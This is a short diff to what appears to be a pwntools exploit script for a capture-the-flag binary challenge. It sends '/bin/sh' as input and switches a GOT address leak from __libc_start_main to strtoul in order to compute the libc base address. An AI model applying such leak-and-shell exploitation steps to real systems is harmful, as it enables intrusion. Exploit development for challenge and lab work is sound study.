@@ -35,11 +35,11 @@ if __name__ == "__main__":
     r.recvuntil("what's your name?")
 
     s('/bin/sh\x00')
-    
+
     r.recvuntil('[q]uit\n')
+    
+    leaked = leak(b.got['strtoul'])
 
-    LIBC_START_MAIN = leak(0x804d03c)
+    log.info('LIBC_BASE: 0x%x' % (leaked - libc.symbols['strtoul']))
 
-    log.info('LIBC_START_MAIN: 0x%x' % LIBC_START_MAIN)
-
-    raw_input('after leaking __libc_start_main@got...')
+    raw_input('after leaking strtoul@got...')
